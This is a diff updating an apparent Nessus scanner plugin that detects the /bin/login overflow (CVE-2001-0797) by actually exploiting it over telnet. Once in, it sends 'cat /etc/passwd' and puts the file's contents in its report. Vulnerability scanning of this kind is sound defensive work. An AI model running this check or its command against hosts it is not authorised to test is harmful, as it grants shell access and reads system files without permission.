@@ -1,33 +1,42 @@
 #
-# This plugin was written by Renaud Deraison <deraison@nessus.org> and
-# is released under the GPL. It's redundant with plugin #10827, however
-# it allows us to quickly spot false positives and shows a sensitive
-# file to the user.
+# (C) Tenable Network Security
+#  
 
-desc = "There is a bug in the remote /bin/login which
-allows an attacker to gain a shell on this host, without
-even sending a shell code. 
+desc = "
+Synopsis :
 
-An attacker may use this flaw to log in as any user
-(except root) on the remote host.";
+It is possible to execute arbitrary commands on the remote host.
 
-sol =  "Solution : See http://www.cert.org/advisories/CA-2001-34.html
-Risk factor : High";
+Description :
 
+The remote implementation of the /bin/login utility, used when authenticating
+a user via telnet or rsh contains an overflow which allows an attacker to 
+gain a shell on this host, without even sending a shell code. 
+
+An attacker may use this flaw to log in as any user (except root) on the 
+remote host.
+
+Solution :
+
+http://www.cert.org/advisories/CA-2001-34.html
+
+Risk factor :
+
+Critical / CVSS Base Score : 10 
+(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";
 
 
 
 if (description) {
    script_id(11136);
+   if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-a-0014");
+   script_bugtraq_id(3681, 5848);
    script_cve_id("CVE-2001-0797");
-   script_version("$Revision: 1.2 $");
-  script_bugtraq_id(3681);
+   script_version("$Revision: 1.8 $");
   name["english"] = "/bin/login overflow exploitation";
   script_name(english:name["english"]);
  
-  descr = string(desc, "\n\n", sol);
-  
-  script_description(english:descr);
+  script_description(english:desc);
  
   summary["english"] = "Attempts to log into the remote host";
   script_summary(english:summary["english"]);
@@ -35,7 +44,7 @@ if (description) {
   # It might cause problem on some systems
   script_category(ACT_DESTRUCTIVE_ATTACK);
  
-  script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
+  script_copyright(english:"This script is Copyright (C) 2002 - 2006 Tenable Network Security, Inc");
 
   family["english"] = "Gain a shell remotely";
   script_family(english:family["english"]);
@@ -65,7 +74,7 @@ function init()
 	0xFF, 252, 0x23));
  r = recv(socket:soc, length:30);
  lim = strlen(r);
- for(i=0;i<lim;i=i+3)
+ for(i=0;i<lim - 2;i=i+3)
  {
   if(!(ord(r[i+2]) == 0x27))
   {
@@ -107,10 +116,8 @@ if(soc)
    send(socket:soc, data:string("cat /etc/passwd\r\n"));
    r = recv(socket:soc, length:4096);
    
-   report = string(desc, "\n\n",
-   "Here is the output of the command 'cat /etc/passwd' :\n",
-   r, 
-   "\n\n", sol);
+   report = string(desc, "\n\nPlugin output :\n\n",
+   "Here is the output of the command 'cat /etc/passwd' :\n", r);
    security_hole(port:port, data:report);
   }
 }
